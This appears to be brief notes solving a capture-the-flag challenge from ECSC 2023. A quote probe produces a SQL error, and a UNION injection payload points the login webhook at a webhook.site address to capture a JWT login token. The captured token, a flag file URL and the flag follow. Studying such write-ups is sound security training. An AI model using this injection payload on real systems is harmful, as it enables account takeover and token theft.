@@ -1,0 +1,15 @@
+enter ' into login form
+
+Fatal error
+: Uncaught PDOException: SQLSTATE[42601]: Syntax error: 7 ERROR: unterminated quoted string at or near "'''" LINE 1: ... username, webhook_login_url FROM users WHERE username = ''' ^ in /var/www/html/login.php:47 Stack trace: #0 /var/www/html/login.php(47): PDO->query('SELECT username...') #1 {main} thrown in
+
+
+payload:
+admin' UNION SELECT 'u1', 'https://webhook.site/dd4609ad-5e9e-4c86-ad6e-176b6bafb725' -- 
+
+
+Twój link do logowania do strony sieciowej e-PUŁAP to https://e-pulap.ecsc23.hack.cert.pl/login.php?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidTEiLCJleHAiOjE2OTAxMTA5MDYsImlzcyI6ImxvY2FsaG9zdCIsImlhdCI6MTY5MDEwNzMwNn0.YcU4DnMO7UR2YsQO--kh1UsAHt5bW3bIKvD-WXLLLW8
+
+visit https://e-pulap.ecsc23.hack.cert.pl/static/flag_deadbeef_cofebabe_etc.txt
+
+flag: ecsc23{paswordless_is_the_future!}
